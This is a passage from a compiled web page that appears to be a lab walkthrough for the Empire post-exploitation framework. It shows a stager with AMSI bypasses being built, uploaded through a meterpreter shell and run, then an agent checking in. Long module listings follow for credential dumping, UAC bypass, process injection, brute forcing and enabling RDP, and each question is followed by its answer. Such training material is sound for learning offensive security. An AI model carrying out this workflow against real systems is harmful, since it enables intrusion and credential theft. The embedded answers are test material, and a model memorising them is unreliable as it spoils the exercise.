on the screen.\n  Delete           False       True              Switch. Delete .bat after running.\n  Obfuscate        False       False             Switch. Obfuscate the launcher\n                                                 powershell code, uses the\n                                                 ObfuscateCommand for obfuscation types.\n                                                 For powershell only.\n  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n                                                 Only used if Obfuscate switch is True.\n                                                 For powershell only.\n  UserAgent        False       default           User-agent string to use for the staging\n                                                 request (default, none, or other).\n  Proxy            False       default           Proxy to use for request (default, none,\n                                                 or other).\n  ProxyCreds       False       default           Proxy credentials\n                                                 ([domain\\]username:password) to use for\n                                                 request (default, none, or other).\n  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in\n                                                 the stager code.\n  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in\n                                                 the stager code.\n")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},(0,r.kt)("inlineCode",{parentName:"p"},"Listener         True                          Listener to generate stager for."))),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Listener")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"Type execute to finish creating our stager. Where is the stager saved?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: stager/windows/launcher_bat) > set Listener http1\n(Empire: stager/windows/launcher_bat) > execute\n\n[*] Stager output written out to: /tmp/launcher.bat\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"/tmp/launcher.bat")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package. ")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"exit\nmeterpreter > upload /tmp/launcher.bat launcher.bat\n[*] uploading  : /tmp/launcher.bat -> launcher.bat\n[*] Uploaded 5.13 KiB of 5.13 KiB (100.0%): /tmp/launcher.bat -> launcher.bat\n[*] uploaded   : /tmp/launcher.bat -> launcher.bat\nmeterpreter > shell\nProcess 1924 created.\nChannel 5 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32>launcher.bat\nlauncher.bat\n\nC:\\Windows\\system32>\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: stager/windows/launcher_bat) > \n[*] Sending POWERSHELL stager (stage 1) to 10.10.80.135\n[*] New agent FKRDZB8C checked in\n[+] Initial agent FKRDZB8C from 10.10.80.135 now active (Slack)\n[*] Sending agent (stage 2) to FKRDZB8C at 10.10.80.135\n\n(Empire: stager/windows/launcher_bat) >\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("h2",{id:"agents-and-post-exploitation"},"Agents and Post-Exploitation"),(0,r.kt)("p",null,"Interact with our ses.. er agents and do neat things."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"First, type agents to view our registered agents.")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Once you've typed agents to list the registered agents, the agents submenu will become active. Use the help menu to answer the following questions.")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What command do we use to interact with an agent?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: stager/windows/launcher_bat) > agents\n\n[*] Active agents:\n\n Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n FKRDZB8C ps 10.10.80.135    JON-PC            *WORKGROUP\\SYSTEM       powershell         2492   5/0.0    2020-10-03 23:26:43  http1           \n\n(Empire: agents) > interact FKRDZB8C\n(Empire: FKRDZB8C) >\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"interact")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"What about if we wanted to list any usernames and passwords we have gathered?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > creds\n\nCredentials:\n\n  CredID  CredType   Domain                   UserName         Host             Password\n  ------  --------   ------                   --------         ----             --------\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"creds")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"And if we wanted to 'deactivate' an agent for a while to avoid detection?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > sleep\n(Empire: FKRDZB8C) >\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"sleep")),(0,r.kt)("ol",{start:6},(0,r.kt)("li",{parentName:"ol"},"How about if we wanted to delete an agent or disconnect it?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > kill\n[!] Please enter a process name or ID.\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"kill")),(0,r.kt)("ol",{start:7},(0,r.kt)("li",{parentName:"ol"},"Moving into the post exploitation modules, what command can we use to search through these?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > searchmodule\n[!] Please enter a search term.\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"searchmodule")),(0,r.kt)("ol",{start:8},(0,r.kt)("li",{parentName:"ol"},"We'll start with the most important module, find the module which plays a specific AC/DC song.")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > searchmodule thunderstruck\n\n python/trollsploit/osx/thunderstruck\n\n        Open Safari in the background and play Thunderstruck.\n\n\n powershell/trollsploit/thunderstruck\n\n        Play's a hidden version of AC/DC's Thunderstruck video while maxing\n        out a computer's volume.\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"powershell/trollsploit/thunderstruck")),(0,r.kt)("ol",{start:9},(0,r.kt)("li",{parentName:"ol"},"What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > searchmodule lsa\n\n powershell/credentials/invoke_internal_monologue*\n\n        Uses the Internal Monologue attack to force easily-decryptable Net-\n        NTLMv1 responses over localhost and without directly touching LSASS.\n        https://github.com/eladshamir/Internal-Monologue\n\n\n powershell/credentials/mimikatz/dcsync\n\n        Runs PowerSploit's Invoke-Mimikatz function to extract a given account\n        password through Mimikatz's lsadump::dcsync module. This doesn't need\n        code execution on a given DC, but needs to be run from a user context\n        with DA equivalent privileges.\n\n\n powershell/credentials/mimikatz/lsadump*\n\n        Runs PowerSploit's Invoke-Mimikatz function to extract a particular\n        user hash from memory. Useful on domain controllers.\n\n\n powershell/credentials/mimikatz/dcsync_hashdump\n\n        Runs PowerSploit's Invoke-Mimikatz function to collect all domain\n        hashes using Mimikatz'slsadump::dcsync module. This doesn't need code\n        execution on a given DC, but needs to be run froma user context with\n        DA equivalent privileges.\n\n\n powershell/credentials/mimikatz/pth*\n\n        Runs PowerSploit's Invoke-Mimikatz function to execute sekurlsa::pth\n        to create a new process. with a specific user's hash. Use\n        credentials/tokens to steal the token afterwards.\n\n\n powershell/collection/minidump\n\n        Generates a full-memory dump of a process. Note: To dump another\n        user's process, you must be running from an elevated prompt (e.g to\n        dump lsass)\n\n\n powershell/management/honeyhash*\n\n        Inject artificial credentials into LSASS.\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"}," powershell/credentials/mimikatz/lsadump*\n\n        Runs PowerSploit's Invoke-Mimikatz function to extract a particular\n        user hash from memory. Useful on domain controllers.\n")),(0,r.kt)("ol",{start:10},(0,r.kt)("li",{parentName:"ol"},"Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'(Empire: FKRDZB8C) > searchmodule uac\n\n powershell/situational_awareness/host/get_uaclevel\n\n        Enumerates UAC level\n\n\n powershell/privesc/bypassuac_wscript\n\n        Drops wscript.exe and a custom manifest into C:\\Windows\\ and then\n        proceeds to execute VBScript using the wscript executablewith the new\n        manifest. The VBScript executed by C:\\Windows\\wscript.exe will run\n        elevated.\n\n\n powershell/privesc/bypassuac_env\n\n        Bypasses UAC (even with Always Notify level set) by by performing an\n        registry modification of the "windir" value in "Environment" based on\n        James Forshaw\n        findings(https://tyranidslair.blogspot.cz/2017/05/exploiting-\n        environment-variables-in.html)\n\n\n powershell/privesc/bypassuac_tokenmanipulation\n\n        Bypass UAC module based on the script released by Matt Nelson\n        @enigma0x3 at Derbycon 2017\n\n\n powershell/privesc/bypassuac_sdctlbypass\n\n        Bypasses UAC by performing an registry modification for sdclt (based\n        onhttps://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-\n        exe/)\n\n\n powershell/privesc/bypassuac_eventvwr\n\n        Bypasses UAC by performing an image hijack on the .msc file extension\n        and starting eventvwr.exe. No files are dropped to disk, making this\n        opsec safe.\n\n\n powershell/privesc/ask\n\n        Leverages Start-Process\' -Verb runAs option inside a YES-Required loop\n        to prompt the user for a high integrity context before running the\n        agent code. UAC will report Powershell is requesting Administrator\n        privileges. Because this does not use the BypassUAC DLLs, it should\n        not trigger any AV alerts.\n\n\n powershell/privesc/bypassuac_fodhelper\n\n        Bypasses UAC by performing an registry modification for FodHelper\n        (based onhttps://winscripting.blog/2017/05/12/first-entry-welcome-and-\n        uac-bypass/)\n\n\n powershell/privesc/bypassuac\n\n        Runs a BypassUAC attack to escape from a medium integrity process to a\n        high integrity process. This attack was originally discovered by Leo\n        Davidson. Empire uses components of MSF\'s bypassuac injection\n        implementation as well as an adapted version of PowerSploit\'s Invoke--\n        Shellcode.ps1 script for backend lifting.\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"bypassuac")),(0,r.kt)("ol",{start:11},(0,r.kt)("li",{parentName:"ol"},"What module family allows us to gather additional information about the network we are on?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'(Empire: FKRDZB8C) > searchmodule network\n\n python/situational_awareness/network/port_scan\n\n        Simple Port Scanner.\n\n\n python/situational_awareness/network/gethostbyname\n\n        Uses Python\'s socket.gethostbyname("example.com") function to resolve\n        host names on a remote agent.\n\n\n python/situational_awareness/network/smb_mount\n\n        This module will attempt mount an smb share and execute a command on\n        it.\n\n\n python/situational_awareness/network/find_fruit\n\n        Searches for low-hanging web applications.\n\n\n python/situational_awareness/network/http_rest_api\n\n        Interacts with a HTTP REST API and returns the results back to the\n        screen.\n\n\n python/situational_awareness/network/active_directory/get_fileservers\n\n        This module will list file servers\n\n\n python/situational_awareness/network/active_directory/get_groups\n\n        This module will list all groups in active directory\n\n\n python/situational_awareness/network/active_directory/get_ous\n\n        This module will list all OUs from active directory\n\n\n python/situational_awareness/network/active_directory/get_userinformation\n\n        This module will return the user profile specified\n\n\n python/situational_awareness/network/active_directory/dscl_get_users\n\n        This module will use the current user context to query active\n        directory for a list of users.\n\n\n python/situational_awareness/network/active_directory/get_users\n\n        This module list users found in Active Directory\n\n\n python/situational_awareness/network/active_directory/get_domaincontrollers\n\n        This module will list all domain controllers from active directory\n\n\n python/situational_awareness/network/active_directory/get_groupmembers\n\n        This module will return a list of group members\n\n\n python/situational_awareness/network/active_directory/dscl_get_groupmembers\n\n        This module will use the current user context to query active\n        directory for a list of users in a group.\n\n\n python/situational_awareness/network/active_directory/get_computers\n\n        This module will list all computer objects from active directory\n\n\n python/situational_awareness/network/active_directory/get_groupmemberships\n\n        This module check what groups a user is member of\n\n\n python/situational_awareness/network/active_directory/dscl_get_groups\n\n        This module will use the current user context to query active\n        directory for a list of Groups.\n\n\n python/situational_awareness/network/dcos/chronos_api_start_job\n\n        Start a Chronos job using the HTTP API service for the Chronos\n        Framework\n\n\n python/situational_awareness/network/dcos/etcd_crawler\n\n        Pull keys and values from an etcd configuration store\n\n\n python/situational_awareness/network/dcos/marathon_api_delete_app\n\n        Delete a Marathon App using Marathon\'s REST API\n\n\n python/situational_awareness/network/dcos/chronos_api_add_job\n\n        Add a Chronos job using the HTTP API service for the Chronos Framework\n\n\n python/situational_awareness/network/dcos/chronos_api_delete_job\n\n        Delete a Chronos job using the HTTP API service for the Chronos\n        Framework\n\n\n python/situational_awareness/network/dcos/marathon_api_create_start_app\n\n        Create and Start a Marathon App using Marathon\'s REST API\n\n\n python/collection/osx/sniffer*\n\n        This module will do a full network stack capture.\n\n\n powershell/situational_awareness/network/get_sql_instance_domain\n\n        Returns a list of SQL Server instances discovered by querying a domain\n        controller for systems with registered MSSQL service principal names.\n        The function will default to the current user\'s domain and logon\n        server, but an alternative domain controller can be provided. UDP\n        scanning of management servers is optional.\n\n\n powershell/situational_awareness/network/get_spn\n\n        Displays Service Principal Names (SPN) for domain accounts based on\n        SPN service name, domain account, or domain group via LDAP queries.\n\n\n powershell/situational_awareness/network/get_sql_server_info\n\n        Returns basic server and user information from target SQL Servers.\n\n\n powershell/situational_awareness/network/arpscan\n\n        Performs an ARP scan against a given range of IPv4 IP Addresses.\n\n\n powershell/situational_awareness/network/smbscanner\n\n        Tests a username/password combination across a number of machines.\n\n\n powershell/situational_awareness/network/smbautobrute\n\n        Runs an SMB brute against a list of usernames/passwords. Will check\n        the DCs to interrogate the bad password count of the users and will\n        keep bruting until either a valid credential is discoverd or the bad\n        password count reaches one below the threshold. Run "shell net\n        accounts" on a valid agent to determine the lockout threshold. VERY\n        noisy! Generates a ton of traffic on the DCs.\n\n\n powershell/situational_awareness/network/bloodhound\n\n        Execute BloodHound data collection.\n\n\n powershell/situational_awareness/network/bloodhound3\n\n        Execute BloodHound data collection (ingestor for version 3).\n\n\n powershell/situational_awareness/network/reverse_dns\n\n        Performs a DNS Reverse Lookup of a given IPv4 IP Range.\n\n\n powershell/situational_awareness/network/get_kerberos_service_ticket*\n\n        Retrieves IP addresses and usernames using event ID 4769 this can\n        allow identification of a users machine. Can only run on a domain\n        controller.\n\n\n powershell/situational_awareness/network/smblogin\n\n        Validates username & password combination(s) across a host or group of\n        hosts using the SMB protocol.\n\n\n powershell/situational_awareness/network/portscan\n\n        Does a simple port scan using regular sockets, based (pretty) loosely\n        on nmap.\n\n\n powershell/situational_awareness/network/powerview/get_group\n\n        Gets a list of all current groups in a domain, or all the groups a\n        given user/group object belongs to. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_domain_policy\n\n        Returns the default domain or DC policy for a given domain or domain\n        controller. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_computer\n\n        Queries the domain for current computer objects. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_ou\n\n        Gets a list of all current OUs in a domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/process_hunter\n\n        Query the process lists of remote machines, searching for processes\n        with a specific name or owned by a specific user. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_loggedon\n\n        Execute the NetWkstaUserEnum Win32API call to query a given host for\n        actively logged on users. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_forest\n\n        Return information about a given forest, including the root domain and\n        SID. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_gpo_computer\n\n        Takes a GPO GUID and returns the computers the GPO is applied to.\n        (Note: This function was removed in PowerView. This now uses a\n        combination of two CmdLets to achieve the same functionality)\n\n\n powershell/situational_awareness/network/powerview/find_managed_security_group\n\n        This function retrieves all security groups in the domain and\n        identifies ones that have a manager set. It also determines whether\n        the manager has the ability to add or remove members from the group.\n        Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_object_acl\n\n        Returns the ACLs associated with a specific active directory object.\n        Part of PowerView. WARNING: specify a specific object, otherwise a\n        huge amount of data will be returned.\n\n\n powershell/situational_awareness/network/powerview/get_fileserver\n\n        Returns a list of all file servers extracted from user homedirectory,\n        scriptpath, and profilepath fields. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_subnet_ranges\n\n        Pulls hostnames from AD, performs a Reverse DNS lookup, and parses the\n        output into ranges.\n\n\n powershell/situational_awareness/network/powerview/get_rdp_session\n\n        Query a given RDP remote service for active sessions and originating\n        IPs (replacement for qwinsta). Note: needs admin rights on the remote\n        server you\'re querying\n\n\n powershell/situational_awareness/network/powerview/map_domain_trust\n\n        Maps all reachable domain trusts with .CSV output. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_site\n\n        Gets a list of all current sites in a domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_group_member\n\n        Returns the members of a given group, with the option to "Recurse" to\n        find all effective group members. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_domain_controller\n\n        Returns the domain controllers for the current domain or the specified\n        domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_gpo\n\n        Gets a list of all current GPOs in a domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/find_foreign_user\n\n        Enumerates users who are in groups outside of their principal domain.\n        Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_domain_trust\n\n        Return all domain trusts for the current domain or a specified domain.\n        Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/find_foreign_group\n\n        Enumerates all the members of a given domain\'s groups and finds users\n        that are not in the queried domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_localgroup\n\n        Returns a list of all current users in a specified local group on a\n        local or remote machine. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_subnet\n\n        Gets a list of all current subnets in a domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_session\n\n        Execute the NetSessionEnum Win32API call to query a given host for\n        active sessions on the host. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_cached_rdpconnection\n\n        Uses remote registry functionality to query all entries for the\n        Windows Remote Desktop Connection Client" on a machine. Part of\n        PowerView.\n\n\n powershell/situational_awareness/network/powerview/user_hunter\n\n        Finds which machines users of a specified group are logged into. Part\n        of PowerView.\n\n\n powershell/situational_awareness/network/powerview/find_localadmin_access\n\n        Finds machines on the local domain where the current user has local\n        administrator access. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/find_gpo_location\n\n        Takes a user/group name and optional domain, and determines the\n        computers in the domain the user/group has local admin (or RDP) rights\n        to. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/set_ad_object\n\n        Takes a SID, name, or SamAccountName to query for a specified domain\n        object, and then sets a specified "PropertyName" to a specified\n        "PropertyValue". Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/share_finder\n\n        Finds shares on machines in the domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/find_gpo_computer_admin\n\n        Takes a computer (or GPO) object and determines what users/groups have\n        administrative access over it. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_dfs_share\n\n        Returns a list of all fault-tolerant distributed file systems for a\n        given domain. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_forest_domain\n\n        Return all domains for a given forest. Part of PowerView.\n\n\n powershell/situational_awareness/network/powerview/get_user\n\n        Query information for a given user or users in the specified domain.\n        Part of PowerView.\n\n\n powershell/collection/netripper\n\n        Injects NetRipper into targeted processes, which uses API hooking in\n        order to intercept network traffic and encryption related functions\n        from a low privileged user, being able to capture both plain-text\n        traffic and encrypted traffic before encryption/after decryption.\n\n\n powershell/recon/find_fruit\n\n        Searches a network range for potentially vulnerable web services.\n\n\n powershell/recon/fetch_brute_local\n\n        This module will logon to a member server using the agents account or\n        a provided account, fetch the local accounts and perform a network\n        based brute force attack.\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"recon")),(0,r.kt)("ol",{start:12},(0,r.kt)("li",{parentName:"ol"},"Our process we have compromised might not be the most stable, how do we migrate to another process? (This will have a specific module answer)")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > searchmodule process\n\n python/management/osx/shellcodeinject64*\n\n        Inject shellcode into a x64 bit process\n\n\n powershell/credentials/tokens\n\n        Runs PowerSploit's Invoke-TokenManipulation to enumerate Logon Tokens\n        available and uses them to create new processes. Similar to\n        Incognito's functionality. Note: if you select ImpersonateUser or\n        CreateProcess, you must specify one of Username, ProcessID, Process,\n        or ThreadId.\n\n\n powershell/credentials/mimikatz/pth*\n\n        Runs PowerSploit's Invoke-Mimikatz function to execute sekurlsa::pth\n        to create a new process. with a specific user's hash. Use\n        credentials/tokens to steal the token afterwards.\n\n\n powershell/situational_awareness/host/paranoia*\n\n        Continuously check running processes for the presence of suspicious\n        users, members of groups, process names, and for any processes running\n        off of USB drives.\n\n\n powershell/situational_awareness/network/powerview/process_hunter\n\n        Query the process lists of remote machines, searching for processes\n        with a specific name or owned by a specific user. Part of PowerView.\n\n\n powershell/collection/minidump\n\n        Generates a full-memory dump of a process. Note: To dump another\n        user's process, you must be running from an elevated prompt (e.g to\n        dump lsass)\n\n\n powershell/collection/netripper\n\n        Injects NetRipper into targeted processes, which uses API hooking in\n        order to intercept network traffic and encryption related functions\n        from a low privileged user, being able to capture both plain-text\n        traffic and encrypted traffic before encryption/after decryption.\n\n\n powershell/trollsploit/process_killer\n\n        Kills any process starting with a particular name.\n\n\n powershell/trollsploit/rick_ascii\n\n        Spawns a a new powershell.exe process that runs Lee Holmes' ASCII Rick\n        Roll.\n\n\n powershell/trollsploit/rick_astley\n\n        Runs @SadProcessor's beeping rickroll.\n\n\n powershell/management/reflective_inject\n\n        Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick\n        which executes PS codefrom memory in a remote process\n\n\n powershell/management/psinject\n\n        Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick\n        which executes PS codefrom memory in a remote process. ProcID or\n        ProcName must be specified.\n\n\n powershell/management/spawn\n\n        Spawns a new agent in a new powershell.exe process.\n\n\n powershell/management/shinject\n\n        Injects a PIC shellcode payload into a target process, via Invoke-\n        Shellcode\n\n\n powershell/code_execution/invoke_dllinjection\n\n        Uses PowerSploit's Invoke-DLLInjection to inject  a Dll into the\n        process ID of your choosing.\n\n\n powershell/code_execution/invoke_reflectivepeinjection\n\n        Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load a\n        DLL/EXE in to the PowerShell process or reflectively load a DLL in to\n        a remote process.\n\n\n powershell/code_execution/invoke_shellcodemsil\n\n        Execute shellcode within the context of the running PowerShell process\n        without making any Win32 function calls. Warning: This script has no\n        way to validate that your shellcode is 32 vs. 64-bit!Note: Your\n        shellcode must end in a ret (0xC3) and maintain proper stack alignment\n        or PowerShell will crash!\n\n\n powershell/code_execution/invoke_shellcode\n\n        Uses PowerSploit's Invoke--Shellcode to inject shellcode into the\n        process ID of your choosing or within the context of the running\n        PowerShell process. If you're injecting custom shellcode, make sure\n        it's in the correct format and matches the architecture of the process\n        you're injecting into.\n\n\n powershell/privesc/ask\n\n        Leverages Start-Process' -Verb runAs option inside a YES-Required loop\n        to prompt the user for a high integrity context before running the\n        agent code. UAC will report Powershell is requesting Administrator\n        privileges. Because this does not use the BypassUAC DLLs, it should\n        not trigger any AV alerts.\n\n\n powershell/privesc/bypassuac\n\n        Runs a BypassUAC attack to escape from a medium integrity process to a\n        high integrity process. This attack was originally discovered by Leo\n        Davidson. Empire uses components of MSF's bypassuac injection\n        implementation as well as an adapted version of PowerSploit's Invoke--\n        Shellcode.ps1 script for backend lifting.\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"powershell/management/psinject")),(0,r.kt)("ol",{start:13},(0,r.kt)("li",{parentName:"ol"},"Last but not least, what module can we use to turn on remote desktop access for our purposes?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: FKRDZB8C) > searchmodule rdp\n\n python/collection/osx/pillage_user\n\n        Pillages the current user for their keychain, bash_history, ssh known\n        hosts, recent folders, etc. For logon.keychain, use\n        https://github.com/n0fate/chainbreaker .For other .plist files, check\n        https://davidkoepi.wordpress.com/2013/07/06/macforensics5/\n\n\n powershell/credentials/sessiongopher\n\n        Extract saved sessions & passwords for WinSCP, PuTTY, SuperPuTTY,\n        FileZilla, RDP, .ppk files, .rdp files, .sdtid files\n\n\n powershell/situational_awareness/network/powerview/get_rdp_session\n\n        Query a given RDP remote service for active sessions and originating\n        IPs (replacement for qwinsta). Note: needs admin rights on the remote\n        server you're querying\n\n\n powershell/situational_awareness/network/powerview/get_cached_rdpconnection\n\n        Uses remote registry functionality to query all entries for the\n        Windows Remote Desktop Connection Client\" on a machine. Part of\n        PowerView.\n\n\n powershell/situational_awareness/network/powerview/find_gpo_location\n\n        Takes a user/group name and optional domain, and determines the\n        computers in the domain the user/group has local admin (or RDP) rights\n        to. Part of PowerView.\n\n\n powershell/management/enable_rdp*\n\n        Enables RDP on the remote machine and adds a firewall exception.\n\n\n powershell/management/enable_multi_rdp*\n\n        [!] WARNING: Experimental! Runs PowerSploit's Invoke-Mimikatz function\n        to patch the Windows terminal service to allow multiple users to\n        establish simultaneous RDP connections.\n\n\n powershell/management/disable_rdp*\n\n        Disables RDP on the remote machine.\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"powershell/management/enable_rdp")))}m.isMDXComponent=!0}}]);